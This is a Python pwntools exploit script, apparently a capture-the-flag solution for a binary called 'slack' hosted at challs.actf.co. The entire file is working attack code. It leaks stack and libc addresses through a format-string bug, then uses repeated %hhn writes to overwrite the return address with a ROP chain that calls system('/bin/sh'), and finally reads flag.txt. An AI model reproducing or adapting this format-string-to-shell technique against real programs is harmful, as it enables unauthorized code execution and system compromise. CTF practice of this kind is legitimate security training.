#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from pwn import *

elf = context.binary = ELF('slack', checksec=True)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'challs.actf.co'
	port = int(args.PORT or 31500)
	if args.GDB:
		return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([elf.path] + argv, env=env, *a, **kw)

gdbscript = '''
brva 0x145B
# brva 0x146E
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

libc = ELF('./libc.so.6')

for _ in range(100):
	with get_conn() as io:
		r = lambda x: io.recv(x)
		rl = lambda: io.recvline(keepends=False)
		ru = lambda x: io.recvuntil(x, drop=True)
		cl = lambda: io.clean(timeout=1)
		s = lambda x: io.send(x)
		sa = lambda x, y: io.sendafter(x, y)
		sl = lambda x: io.sendline(x)
		sla = lambda x, y: io.sendlineafter(x, y)
		ia = lambda: io.interactive()
		li = lambda s: log.info(s)
		ls = lambda s: log.success(s)

		sla(b'Professional): ', 4*b'%p.')
		leaks = rl()

		stack_leak, _, libc_leak, *rest = leaks.decode().split('You: ')[1].split('.')
		stack_leak = int(stack_leak, 16)
		libc_leak = int(libc_leak, 16)
		libc.address = libc_leak - 0x114a37
		rop = ROP(libc)
		POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret'])[0]
		RET = POP_RDI_RET + 1
		SYSTEM = libc.symbols['system']
		BIN_SH = next(libc.search(b'/bin/sh\x00'))

		ret_addr = stack_leak + 0x2198
		i_location = ret_addr - 14 * 8
		i_location += 3 # point at msb, so int will become negative

		ls(f'stack_leak: {stack_leak:#x}')
		ls(f'libc_leak: {libc_leak:#x}')
		ls(f'ret_addr: {ret_addr:#x}')
		ls(f'libc.address {libc.address:#x}')
		ls(f'POP_RDI_RET {POP_RDI_RET:#x}')

		# my input on $14
		# sla(b'Professional): ', b'%14$llx')

		to_write = i_location & 0xFFFF
		if to_write > 0x2710:
			li("unable to write")
			continue

		li(f'to_write {to_write:#x}')
		sla(b'Professional): ', f'%{to_write}c%25$hn'.encode())

		# loop cnt is on 7th pos
		# sla(b'Professional): ', b'%7$hhn')

		sla(b'Professional): ', f'%255c%55$hhn'.encode())

		# program is looped at this point
		li('Setting ptr chain to point at retaddr from main...')
		to_write = ret_addr & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

		to_write = (ret_addr >> 8) & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())


		li('Overwriting retaddr with pop rdi')
		for i in range(6):
			to_write = ret_addr & 0xFF
			to_write += i
			sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

			to_write = (POP_RDI_RET >> (i*8)) & 0xFF
			li(f'writing byte: {to_write:#x}')
			sla(b'Professional): ', f'%{to_write}c%55$hhn'.encode())



		li('Setting ptr chain to point at retaddr+8 from main...')
		ret_addr += 8
		to_write = ret_addr & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

		to_write = (ret_addr >> 8) & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

		li('Overwriting retaddr with bin_sh')
		for i in range(6):
			to_write = ret_addr & 0xFF
			to_write += i
			sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

			to_write = (BIN_SH >> (i*8)) & 0xFF
			li(f'writing byte: {to_write:#x}')
			sla(b'Professional): ', f'%{to_write}c%55$hhn'.encode())


		li('Setting ptr chain to point at retaddr+0x10 from main...')
		ret_addr += 8
		to_write = ret_addr & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

		to_write = (ret_addr >> 8) & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

		li('Overwriting retaddr with RET')
		for i in range(6):
			to_write = ret_addr & 0xFF
			to_write += i
			sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

			to_write = (RET >> (i*8)) & 0xFF
			li(f'writing byte: {to_write:#x}')
			sla(b'Professional): ', f'%{to_write}c%55$hhn'.encode())


		li('Setting ptr chain to point at retaddr+0x18 from main...')
		ret_addr += 8
		to_write = ret_addr & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

		to_write = (ret_addr >> 8) & 0xFF
		sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

		li('Overwriting retaddr with system')
		for i in range(6):
			to_write = ret_addr & 0xFF
			to_write += i
			sla(b'Professional): ', f'%{to_write}c%25$hhn'.encode())

			to_write = (SYSTEM >> (i*8)) & 0xFF
			li(f'writing byte: {to_write:#x}')
			sla(b'Professional): ', f'%{to_write}c%55$hhn'.encode())

		li('Restoring i variable')
		to_write = i_location & 0xFFFF
		li(f'to_write {to_write:#x}')
		sla(b'Professional): ', f'%{to_write}c%25$hn'.encode())
		sla(b'Professional): ', f'%55$hhn'.encode())
		try:
			sleep(2)
			sl(b'ls')
			sl(b'cat flag.txt')
			data = cl()
			if b'ctf' in data:
				print(data)
				break
		except:
			li('nope')

